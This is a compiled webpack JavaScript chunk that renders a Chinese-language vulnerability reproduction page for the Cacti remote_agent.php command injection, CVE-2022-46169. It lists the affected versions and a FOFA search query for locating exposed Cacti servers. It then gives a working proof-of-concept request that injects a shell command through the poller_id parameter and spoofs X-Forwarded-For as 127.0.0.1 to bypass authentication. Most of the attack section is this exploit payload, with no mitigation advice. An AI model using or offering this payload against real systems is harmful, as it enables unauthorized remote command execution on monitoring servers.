(window.webpackJsonp=window.webpackJsonp||[]).push([[228],{2018:function(t,a,s){t.exports=s.p+"assets/img/1671182791178-ea22a02a-7451-4ad6-b9fb-03dcc3a17651.495a9459.png"},2019:function(t,a,s){t.exports=s.p+"assets/img/1671183300849-373782ab-7b1d-4166-88a7-34657bfb6025.d088fcbc.png"},2020:function(t,a,s){t.exports=s.p+"assets/img/1671183331943-89eccd02-cf00-478f-8093-173a5c14bd47.d16e9002.png"},3102:function(t,a,s){"use strict";s.r(a);var r=s(64),e=Object(r.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"cacti-remote-agent-php-远程命令执行漏洞-cve-2022-46169"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cacti-remote-agent-php-远程命令执行漏洞-cve-2022-46169"}},[t._v("#")]),t._v(" Cacti remote_agent.php 远程命令执行漏洞 CVE-2022-46169")]),t._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),a("p",[t._v("Cacti是一个服务器监控与管理平台。在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。")]),t._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("Cacti < 1.2.17-1.2.22")]),a("br"),t._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v('app="Cacti-监控系统"')]),a("br"),t._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),a("p",[t._v("登陆页面")]),t._v(" "),a("p",[a("img",{attrs:{src:s(2018),alt:"img"}})]),t._v(" "),a("p",[t._v("验证POC")]),t._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[t._v("GET "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("remote_agent"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php?action"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("polldata"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("local_data_ids"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("host_id"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("poller_id"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("`"),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("txt`\nX"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Forwarded"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("For"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("127.0")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v(".1")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[a("img",{attrs:{src:s(2019),alt:"img"}})]),t._v(" "),a("p",[a("img",{attrs:{src:s(2020),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);